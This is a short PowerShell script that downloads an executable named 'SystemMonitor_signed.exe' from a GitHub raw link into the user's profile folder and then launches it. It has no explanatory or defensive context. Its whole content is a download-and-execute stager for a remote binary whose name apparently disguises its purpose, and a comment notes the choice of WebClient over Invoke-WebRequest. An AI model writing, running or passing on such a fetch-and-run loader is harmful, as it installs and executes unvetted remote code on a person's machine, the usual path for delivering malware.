$path = "$env:USERPROFILE\SystemMonitor_signed.exe"
$url = "https://github.com/EncryptedByRollerV8/e/raw/main/SystemMonitor_signed.exe"

# Use .NET WebClient instead of Invoke-WebRequest
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $path)

if (Test-Path $path) {
    Start-Process $path
}

